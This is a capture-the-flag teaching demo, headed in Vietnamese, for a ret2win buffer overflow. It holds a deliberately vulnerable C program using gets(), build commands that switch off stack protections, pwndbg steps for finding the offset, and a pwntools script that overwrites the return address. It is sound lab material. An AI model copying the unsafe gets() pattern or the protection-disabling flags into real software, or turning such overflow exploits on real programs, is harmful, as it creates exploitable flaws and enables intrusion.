# ret2win_chall_demo_file

## ret2win.c
#include <stdio.h>
#include <string.h>
void win() {
    printf("\nWELL DONE! THIS IS YOUR FLAG: CTF{ret2win_64bit_success}\n");
}
void vulnerable() {
    char buffer[32];
    printf("Enter input: ");
    gets(buffer); // Classic buffer overflow
}
int main() {
    setbuf(stdout, NULL);
    printf("=== 64-bit RET2WIN CHALLENGE ===\n");
    vulnerable();
    printf("Try again!\n");
    return 0;
}


## Cài đặt công cụ biên dịch
* sudo apt update
* sudo apt install gcc gcc-multilib -y

## Biên dịch binary
### 32-bit (chall)
* gcc -m32 -fno-stack-protector -no-pie -z execstack ret2win.c -o chall
### 64-bit (chall64)
* gcc -fno-stack-protector -no-pie -z execstack ret2win.c -o chall64


## Cấp quyền thực thi
* chmod +x chall chall64


## Kiểm tra bảo mật
* pip install pwntools    # cài pwntools nếu chưa có

* checksec chall
* checksec chall64


## Tạo pattern
* pwndbg> cyclic <length>


## Khi chương trình crash, kiểm tra giá trị EIP/RIP:
* info registers eip  # 32-bit
* info registers rip  # 64-bit


## Tìm offset từ giá trị EIP/RIP:
* cyclic -l <giá_trị_eip/rip>


## Tìm địa chỉ hàm win
* p & win


## Viết script (solve1.py)
from pwn import *

p = process('./chall_ret2win')

offset = 40                    #Độ dài offset
win_addr = 0x401156            #Địa chỉ hàm win

payload = b'A' * offset        #Tạo input gây BOF
payload += p64(win_addr)       #Ghi đè địa chỉ hàm win lên return address

p.sendline(payload)
p.interactive()


## Chạy script
* python3 solve1.py
